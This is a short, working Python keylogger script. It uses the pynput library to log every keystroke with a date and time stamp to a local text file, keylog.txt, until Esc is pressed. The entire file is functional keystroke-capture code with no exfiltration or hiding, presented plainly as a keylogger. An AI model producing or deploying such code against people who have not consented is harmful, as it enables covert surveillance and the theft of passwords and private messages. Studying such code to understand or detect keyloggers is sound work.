#Simple keylogger with date and time 

#Import the necessary libraries
from pynput.keyboard import Key, Listener
from datetime import datetime

# File to store logs
log_file = "keylog.txt"

#key press 
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")

    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - [SPACE]\n")

            elif key == Key.enter:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - [ENTER]\n")

            else:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")

#key release
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()